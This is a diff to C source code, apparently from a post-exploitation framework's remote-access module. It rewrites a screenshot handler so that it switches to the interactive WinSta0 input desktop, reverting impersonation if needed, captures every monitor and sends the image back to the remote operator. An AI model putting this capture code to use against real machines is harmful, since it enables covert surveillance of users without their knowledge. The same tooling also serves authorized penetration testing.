@@ -897,40 +897,155 @@ int convert_bmp_and_send(HBITMAP hBmp, HDC hDC, Packet *resp){
 DWORD request_image_get_dev_screen(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-	DWORD res = ERROR_SUCCESS;
+	DWORD dwResult             = ERROR_ACCESS_DENIED;
+	HWINSTA hWindowStation     = NULL;
+	HWINSTA hOrigWindowStation = NULL;
+	HDESK hInputDesktop        = NULL;
+	HDESK hOrigDesktop         = NULL;
+	HWND hDesktopWnd           = NULL;
+	HDC hdc                    = NULL;
+	HDC hmemdc                 = NULL;
+	HBITMAP hbmp               = NULL;
+	OSVERSIONINFO os           = {0};
+	// If we use SM_C[X|Y]VIRTUALSCREEN we can screenshot the whole desktop of a multi monitor display.
+	int xmetric               = SM_CXVIRTUALSCREEN;
+	int ymetric               = SM_CYVIRTUALSCREEN;
+	int xposition             = SM_XVIRTUALSCREEN;
+	int yposition             = SM_YVIRTUALSCREEN;
+	int sx                    = 0;
+	int sy                    = 0;
+	int sxpos                 = 0;
+	int sypos                 = 0;
 
-	HWND hDesktopWnd;	
-	HDC hdc;
-	HDC hmemdc;
-	HBITMAP hbmp;
-	int sx,sy;
-    
-	hDesktopWnd = GetDesktopWindow();
-	hdc = GetDC(hDesktopWnd);
-	hmemdc = CreateCompatibleDC(hdc);
+	do
+	{
+		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 
-	if(hdc){
-		sx = GetSystemMetrics(SM_CXSCREEN);
-        sy = GetSystemMetrics(SM_CYSCREEN);
-        
-        hbmp = CreateCompatibleBitmap(hdc,sx,sy);
-       
-		if (hbmp) {
-			SelectObject(hmemdc, hbmp);
-			BitBlt(hmemdc,0,0,sx,sy,hdc,0,0,SRCCOPY);
-			convert_bmp_and_send(hbmp, hmemdc,response);
-			
-			ReleaseDC(hDesktopWnd,hdc);
-			DeleteDC(hmemdc);
-			DeleteObject(hbmp);
+		if (!GetVersionEx(&os))
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot: GetVersionEx failed")
 
-
-
+		// On NT we cant use SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN.
+		if (os.dwMajorVersion <= 4)
+		{
+			xmetric = SM_CXSCREEN;
+			ymetric = SM_CYSCREEN;
 		}
-	}		
 
-	packet_transmit_response(res, remote, response);
+		// open the WinSta0 as some services are attached to a different window station.
+		hWindowStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
+		if (!hWindowStation)
+		{
+			if (RevertToSelf())
+				hWindowStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
+		}
+
+		// if we cant open the defaut input station we wont be able to take a screenshot
+		if (!hWindowStation)
+			BREAK_WITH_ERROR("[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station", ERROR_INVALID_HANDLE);
+
+		// get the current process's window station so we can restore it later on.
+		hOrigWindowStation = GetProcessWindowStation();
+
+		// set the host process's window station to this sessions default input station we opened
+		if (!SetProcessWindowStation(hWindowStation))
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot: SetProcessWindowStation failed");
+
+		// grab a handle to the default input desktop (e.g. Default or WinLogon)
+		hInputDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
+		if (!hInputDesktop)
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot: OpenInputDesktop failed");
+
+		// get the threads current desktop so we can restore it later on
+		hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());
+
+		// set this threads desktop to that of this sessions default input desktop on WinSta0
+		SetThreadDesktop(hInputDesktop);
+
+		// and now we can grab a handle to this input desktop
+		hDesktopWnd = GetDesktopWindow();
+
+		// and get a DC from it so we can read its pixels!
+		hdc = GetDC(hDesktopWnd);
+		if (!hdc)
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot. GetDC failed");
+
+		// back up this DC with a memory DC
+		hmemdc = CreateCompatibleDC(hdc);
+		if (!hmemdc)
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot. CreateCompatibleDC failed");
+
+		// calculate the width and height
+		sx = GetSystemMetrics(xmetric);
+		sy = GetSystemMetrics(ymetric);
+
+		// calculate the absolute virtual screen position
+		// prevent breaking functionality on <= NT 4.0
+		if (os.dwMajorVersion >= 4)
+		{
+			sxpos = GetSystemMetrics(SM_XVIRTUALSCREEN);
+			sypos = GetSystemMetrics(SM_YVIRTUALSCREEN);
+		}
 
 
-	return res;
+		// and create a bitmap
+		hbmp = CreateCompatibleBitmap(hdc, sx, sy);
+		if (!hbmp)
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot. CreateCompatibleBitmap failed");
+
+		// this bitmap is backed by the memory DC
+		if (!SelectObject(hmemdc, hbmp))
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot. SelectObject failed");
+
+		// BitBlt the screenshot of this sessions default input desktop on WinSta0 onto the memory DC we created
+		// screenshot all available monitors by default
+
+		HMODULE user32 = NULL;
+		if ((user32 = LoadLibraryA("user32")))
+		{
+
+			FARPROC SPDA = GetProcAddress(user32, "SetProcessDPIAware");
+			if (SPDA)
+			{
+				SPDA();
+			}
+			FreeLibrary(user32);
+		}
+		if (!StretchBlt(hmemdc, 0, 0, sx, sy, hdc, sxpos, sypos, GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN), SRCCOPY))
+			BREAK_ON_ERROR("[SCREENSHOT] screenshot. StretchBlt failed");
+
+		if (convert_bmp_and_send(hbmp, hmemdc, response) != 1)
+			BREAK_WITH_ERROR("[SCREENSHOT] screenshot. convert_bmp_and_send failed", ERROR_INVALID_HANDLE);
+
+		dwResult = ERROR_SUCCESS;
+
+	} while(0);
+
+	if (hdc)
+		ReleaseDC(hDesktopWnd, hdc);
+
+	if (hmemdc)
+		DeleteDC(hmemdc);
+
+	if (hbmp)
+		DeleteObject(hbmp);
+
+	// restore the origional process's window station
+	if (hOrigWindowStation)
+		SetProcessWindowStation(hOrigWindowStation);
+
+	// restore the threads origional desktop
+	if (hOrigDesktop)
+		SetThreadDesktop(hOrigDesktop);
+
+	// close the WinSta0 window station handle we opened
+	if (hWindowStation)
+		CloseWindowStation(hWindowStation);
+
+	// close this last to avoid a handle leak...
+	if (hInputDesktop)
+		CloseDesktop(hInputDesktop);
+
+	packet_transmit_response(dwResult, remote, response);
+
+	return dwResult;
 }
